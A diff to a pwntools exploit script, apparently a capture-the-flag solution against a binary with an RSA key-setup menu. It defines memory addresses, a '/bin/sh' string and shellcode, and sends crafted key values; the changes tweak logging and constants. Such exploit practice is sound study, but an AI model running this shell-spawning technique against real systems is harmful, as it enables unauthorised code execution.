@@ -16,7 +16,7 @@ from typing import Tuple
 from pwn import *
 import numpy as np
 
-context.log_level = 'debug'
+context.log_level = 'info'
 
 MODE = 'debug'
 def conn():
@@ -77,11 +77,11 @@ def get_balanced_products(lst, p=1, q=1) -> Tuple[int, int]:
 FUNC = 0x602500
 G_PBUF = 0x602560
 BIN_SH = b'/bin/sh\x00'
-SHORT_MAX_POSITIVE_NUMBER = 2**16 - 1
+SHORT_MAX_POSITIVE_NUMBER = (2**16 / 2) - 1
 
 if __name__ == "__main__":
     pipe = conn()
-    m = 30
+    m = 32
     
     sc = f'mov rdi, {G_PBUF};'
     sc += f'mov rdx, {FUNC + 7*8};'
@@ -102,7 +102,8 @@ if __name__ == "__main__":
     φ_n = (p - 1)*(q - 1) 
     d = mod_inverse(e, φ_n) 
 
-    log.info('setting key pair values')
+    log.info('setting key pair values:')
+    log.info(f'{p=}, {q=}, {e=}, {d=}, {n=}')
     pipe.sendlineafter(b'> ', b'1')
     pipe.sendlineafter(b'p : ', str(p).encode())
     pipe.sendlineafter(b'q : ', str(q).encode())
